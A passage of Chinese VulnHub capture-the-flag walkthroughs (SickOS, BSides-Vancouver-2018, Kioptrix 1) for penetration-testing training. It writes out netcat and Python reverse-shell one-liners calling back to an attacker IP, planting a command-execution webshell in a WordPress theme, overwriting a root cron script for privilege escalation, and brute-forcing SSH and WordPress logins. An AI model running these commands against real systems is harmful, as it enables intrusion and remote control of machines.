思路一
后台可以上传任意后缀文件，上大马，获取webshell:
直接读取文件发现权限不够，没有回显：
查看开放的端口，发现3306开启，但是发现mysql版本大于5.1，无法udf提权：
利用大马功能反弹shell： 
思路二
扫描目录时还发现了cgi-bin目录，通过百度发现可能存在bash漏洞可以直接getshell。利用nc反弹shell。
提升权限
尝试使用su切换用户或者sudo直接查看文件,发现没权限：
进入网站部署的目录：
发现有配置文件，运气好可能有存储明文用户密码：
使用获取的用户密码连接数据库失败，尝试用对应密码进行root登录失败。
查看系统的其他用户，发现sickos账户很特别：
用户名：sickos，密码：john@123登录成功。
sudo命令查看文件：
思路总结
1.利用文件上传漏洞或者bash漏洞获取系统shell。
2.部署的网站可能会存储数据库等明文用户密码，可以加以利用。
第十二节 BSides-Vancouver-2018-Workshop
靶机信息
下载链接
https://download.vulnhub.com/bsidesvancouver2018/BSides-Vancouver-2018-Workshop.ova
靶机说明
靶机用ValualBox创建，目标是在其上获得root级访问。
目标
Boot to root：获得root权限和Flag。
运行环境
靶机：通过ValualBox打开虚拟机，网络连接方式设置为主机模式（host-only），或者将虚拟机、Kali机都桥
接到物理机的无线网卡。测试中使用VMWare导入虚机会无法获得IP，使用ValualBox可正常获得IP。
攻击机：同网段下有Windows攻击机（物理机），安装有Nmap、Burpsuit、Wireshark、Sqlmap、nc、
Hydra、Python2.7、DirBuster、AWVS、Nessus等渗透工具。同样可使用Kali Linux作为攻击机，预装了全
面的渗透工具。
信息收集
IP识别
启动虚拟机，使用nmap扫描C段IP nmap -sP 192.168.56.0/24  获得虚机IP 192.168.56.101
端口和服务识别
Nmap命令： nmap -p1-65535 -open -A 192.168.56.101 -oN BSides.txt
汇总开放的端口和服务：
端口 服务 提示信息
21 FTP vsftpd2.3.5 允许匿名登录
22 ssh OpenSSH 5.9p1
80 http Apache httpd 2.2.22 (Ubuntu)
漏洞挖掘
渗透方法一：
0x01 匿名登录FTP获得用户
Windows下使用XFTP匿名登录FTP：在public目录下，找到users.txt.bk文件，用记事本打开：
获得5个用户名：abatchy，john，mai，anne，doomguy
0x02 用5个用户名加弱口令字典进行ssh暴破
Windows下可使用九头蛇Hydra Windows版本或其他工具暴破，这里采用“超级弱口令检查工具V1.0”进行暴破，线
程不能开太高，否则虚机会挂，4线程。
字典的选择，选用字典：darkweb2017-top10000.txt。
暴破得到用户名：anne 密码：princess
0x03 登录ssh，具有sudo权限，获得ﬂag 
使用Xshell工具ssh登录账号：anne 密码：princess
执行id命令和sudo -l命令，发现anne具有sudo权限：
执行sudo -l /root命令，sudo cat /root/ﬂag.txt命令，获得ﬂag：
渗透方法二：
0x01 环境设置
因需要用到Kali虚机， 需要调整将bsides虚拟机、Kali攻击机都桥接到笔记本电脑的无线网卡，bsides虚拟机会重
新获得新IP。使用Namp扫描无线网卡C段可获得bsides虚机的新IP为：172.20.10.8，Kali虚机的IP是：
172.20.10.9。
Nmap命令： nmap -sP 192.168.56.0/24
同样匿名登录FTP，获得5个用户名：abatchy，john，mai，anne，doomguy
0x02 访问80端口http服务
访问 http://172.20.10.8/
访问 http://172.20.10.8/robots.txt  发现/backup_wordpress目录：
访问 http://172.20.10.8/backup_wordpress/ 进入WordPress页面：
0x03 使用wpscan扫描WordPress，暴破后台用户名和密码：
(1)暴破用户名，命令 wpscan -u http://172.20.10.8/backup_wordpress --enumerate u
获得用户名：admin john
(2)使用wpscan默认字典，暴破密码：
wpscan --url wpscan -u http://172.20.10.8/backup_wordpress --wordlist /root/share/darkweb2017-
top10000.txt --username john
暴破字典依然使用darkweb2017-top10000.txt弱口令字典：
暴破成功，获得用户名john 密码enigma
获取shell
0x04 登录并反弹shell
(1)使用用户名 john 密码enigma登录WordPress，登录地址 http://172.20.10.8/backup_wordpress/wp-
login.php
(2)WordPress获取shell的方法有多种，进入 Appearance -> Editor ，点击右边的 Theme Header ，在编辑器里面
插入一句话命令执行小马  保存。
(3)在Burpsuit中通过cmd参数执行命令，访问 172.20.10.8/backup_wordpress/?cmd=id;ls  成功执行id和ls命令：
(4)通过nc反弹shell 执行命令 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.5 4444
>/tmp/f ，需将命令进行url编码，然后在Burpsuit中发送：
(5)Windows攻击机开启nc接收反弹shell成功：
(6)为查找和传送文件方便，写入菜刀马 echo '' >> caidao.php
菜刀连接成功：
提升权限
0x5 查找用户文件
(1)查找每个用户文件，和浏览各目录文件，发现位于 /usr/local/bin/cleanup 文件，其权限是777，查看内容
为：
#!/bin/sh
rm -rf /var/log/apache2/* # Clean those damn logs!!
这是一段清理Apache日志的脚本，需要root权限运行。
查看cleanup文件的权限为777，可以随意修改和执行，可以将文件内容改成一个反弹shell。
(2)在菜刀中直接修改cleanup文件为反弹shell命令：因在 /usr/local/lib/python2.7/ 目录下安装有Python2.7，
所以可以使用Python反弹shell
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.5",5555)
);os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-
i"]);'
(3)Windows开启NC，等待接收反弹shell，root权限：
(4)查看ﬂag:
思路总结
突破点和坑
1.没有突破点的时候，就尝试暴破已知用户名的密码，字典采用国外密码字段较好。
2.Linux反弹shell有多种姿势，bash、nc、php、Python等都需要尝试。
3.需熟悉WordPress后台getshell姿势。
4.靶机作者提示有多种方法，肯定还有其他方法，本次渗透使用了暴破ssh用户和WordPress渗透两种方法。
第十三节 Kioptrix 1
title: Vulnhub渗透测试练习-Kioptrix 1 date: 2018-05-07 15:28:05 categories: 笔记
作者：Ukonw
信息收集
通过 netdiscover 发现目标主机IP地址。
从扫描信息的得的目标主机的IP地址为 192.168.43.54
nmap 扫描IP的端口信息 nmap -A 192.168.43.54
root@kali:~# nmap -A -sS 192.168.43.54 
Starting Nmap 7.10 ( https://nmap.org ) at 2018-05-07 15:48  
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --
system-dns or specify valid servers with --dns-servers 
Nmap scan report for 192.168.43.54 
Host is up (0.00055s latency). 
Not shown: 994 closed ports 
PORT     STATE SERVICE     VERSION 
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99) 
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) 
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) 
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) 
|_sshv1: Server supports SSHv1 
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 
OpenSSL/0.9.6b) 
| http-methods: 
|_  Potentially risky methods: TRACE 
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b 
|_http-title: Test Page for the Apache Web Server on Red Hat Linux 
root@kali:~# netdiscover 
 Currently scanning: 192.168.63.0/16   |   Screen View: Unique Hosts         
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.43.1    ac:c1:ee:31:3f:25      1      60  Xiaomi Communications Co L
 192.168.43.33   44:03:2c:68:d8:0f      1      60  Intel Corporate           
 192.168.43.54   00:0c:29:7c:3a:16      1      60  VMware, Inc.                     
111/tcp  open  rpcbind     2 (RPC #100000) 
| rpcinfo: 
|   program version   port/proto  service 
|   100000  2            111/tcp  rpcbind 
|   100000  2            111/udp  rpcbind 
|   100024  1           1024/tcp  status 
|_  100024  1           1024/udp  status 
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP) 
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 
OpenSSL/0.9.6b) 
| http-methods: 
|_  Potentially risky methods: TRACE 
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b 
|_http-title: Test Page for the Apache Web Server on Red Hat Linux 
| ssl-cert: Subject: 
commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/
countryName=-- 
| Not valid before: 2009-09-26T09:32:06 
|_Not valid after:  2010-09-26T09:32:06 
|_ssl-date: 2018-05-07T07:50:42+00:00; +1m50s from scanner time. 
| sslv2: 
|   SSLv2 supported 
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5 
|     SSL2_RC2_128_CBC_WITH_MD5 
|     SSL2_RC4_128_WITH_MD5 
|     SSL2_RC4_64_WITH_MD5 
|     SSL2_DES_64_CBC_WITH_MD5 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 
|_    SSL2_RC4_128_EXPORT40_WITH_MD5 
1024/tcp open  status      1 (RPC #100024) 
MAC Address: 00:0C:29:7C:3A:16 (VMware) 
Device type: general purpose 
Running: Linux 2.4.X 
OS CPE: cpe:/o:linux:linux_kernel:2.4 
OS details: Linux 2.4.9 - 2.4.18 (likely embedded) 
Network Distance: 1 hop 
Host script results: 
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: , NetBIOS MAC:  (unknown) 
TRACEROUTE 
HOP RTT     ADDRESS 
1   0.55 ms 192.168.43.54 
OS and Service detection performed. Please report any incorrect results at 
https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds 
443/tcp open ssl/http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
443端口的服务 mod_ssl/2.8.4 OpenSSL/0.9.6b
通过 searchsploit mod_ssl 查询相关漏洞
root@kali:~/Desktop# searchsploit mod_ssl 
--------------------------------------- ---------------------------------------- 
 Exploit Title                         |  Path 
                                       | (/usr/share/exploitdb/) 
--------------------------------------- ---------------------------------------- 
Apache mod_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt 
Apache mod_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt 
Apache mod_ssl  和   
替换exp中的
wget 后的url为 http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c  